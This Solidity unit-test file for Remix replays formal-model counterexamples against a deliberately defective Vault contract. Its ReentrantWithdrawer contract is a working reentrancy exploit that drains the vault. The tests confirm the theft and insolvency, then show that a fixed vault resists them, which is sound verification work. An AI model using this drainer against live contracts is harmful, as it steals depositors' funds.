// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Remix Solidity Unit Tests for the two properties the TLA+ model refutes.
//
// Each test reproduces, as a live transaction, one counterexample Apalache
// and TLC found in Vault.tla:
//
//   * theftOnDefectiveVault      -> NoTheft  (attackerEth <= AttackerDeposit)
//   * insolvencyOnDefectiveVault -> Solvent  (at rest, vaultEth >= ledger owed)
//
// A passing test here means the property fails on the defective `Vault`:
// the exploit the model predicted actually runs. The last two tests are the
// positive control: the same setup on `VaultFixed` keeps both properties.
//
// Run: open this file in Remix, select the "Solidity Unit Testing" plugin,
// and press "Run". The `#value` annotations fund each test with 3 ether so
// it can play both depositors.

import "remix_tests.sol";
import "./Vault.sol";

// The depositor whose receive() calls withdraw() again while the vault's own
// withdraw() is still parked at its external call. Written against an
// interface so one attacker drives both the defective and the fixed vault.
interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrantWithdrawer {
    IVault public immutable vault;
    uint256 public immutable stake;

    constructor(IVault v) payable {
        vault = v;
        stake = msg.value;
        v.deposit{value: msg.value}();
    }

    function attack() external {
        vault.withdraw();
    }

    // Reenter while the vault still holds enough to pay another round. A
    // reentrant round that reverts (the fixed vault, whose ledger is already
    // zeroed) is swallowed, so the outer call still returns.
    receive() external payable {
        if (address(vault).balance >= stake) {
            try vault.withdraw() {} catch {}
        }
    }
}

contract VaultSecurityTest {
    uint256 constant HONEST_DEPOSIT = 2 ether;
    uint256 constant ATTACKER_DEPOSIT = 1 ether;

    // Accept ether so the `#value` funding lands and any refund is held.
    receive() external payable {}

    /// #value: 3000000000000000000
    function theftOnDefectiveVault() public payable {
        Vault vault = new Vault();
        vault.deposit{value: HONEST_DEPOSIT}(); // this contract is the honest depositor
        ReentrantWithdrawer attacker =
            new ReentrantWithdrawer{value: ATTACKER_DEPOSIT}(IVault(address(vault)));

        attacker.attack();

        // The ledger credited the attacker once; they left holding more than
        // they deposited. This is the NoTheft counterexample.
        Assert.greaterThan(
            address(attacker).balance,
            ATTACKER_DEPOSIT,
            "defective vault: attacker should end richer than their deposit"
        );
    }

    /// #value: 3000000000000000000
    function insolvencyOnDefectiveVault() public payable {
        Vault vault = new Vault();
        vault.deposit{value: HONEST_DEPOSIT}();
        ReentrantWithdrawer attacker =
            new ReentrantWithdrawer{value: ATTACKER_DEPOSIT}(IVault(address(vault)));

        attacker.attack();

        uint256 owed = vault.balances(address(this)) + vault.balances(address(attacker));

        // Every withdraw() has returned, so the system is at rest. The vault
        // holds less ether than its ledger still owes: the honest depositor's
        // 2 ether cannot all be paid. This is the Solvent counterexample.
        Assert.lesserThan(
            address(vault).balance,
            owed,
            "defective vault: at rest it should hold less than its ledger owes"
        );
    }

    /// #value: 3000000000000000000
    function fixPreventsTheft() public payable {
        VaultFixed vault = new VaultFixed();
        vault.deposit{value: HONEST_DEPOSIT}();
        ReentrantWithdrawer attacker =
            new ReentrantWithdrawer{value: ATTACKER_DEPOSIT}(IVault(address(vault)));

        attacker.attack();

        // Effect before interaction: the reentrant round reads a zeroed ledger,
        // reverts, and is swallowed. The attacker gets back exactly their stake.
        Assert.equal(
            address(attacker).balance,
            ATTACKER_DEPOSIT,
            "fixed vault: attacker should recover exactly their deposit"
        );
    }

    /// #value: 3000000000000000000
    function fixStaysSolvent() public payable {
        VaultFixed vault = new VaultFixed();
        vault.deposit{value: HONEST_DEPOSIT}();
        ReentrantWithdrawer attacker =
            new ReentrantWithdrawer{value: ATTACKER_DEPOSIT}(IVault(address(vault)));

        attacker.attack();

        uint256 owed = vault.balances(address(this)) + vault.balances(address(attacker));

        // At rest the vault still covers its whole ledger exactly: the honest
        // 2 ether is intact and the attacker's entry is zeroed.
        Assert.equal(
            address(vault).balance,
            owed,
            "fixed vault: at rest it should still cover its ledger"
        );
    }
}
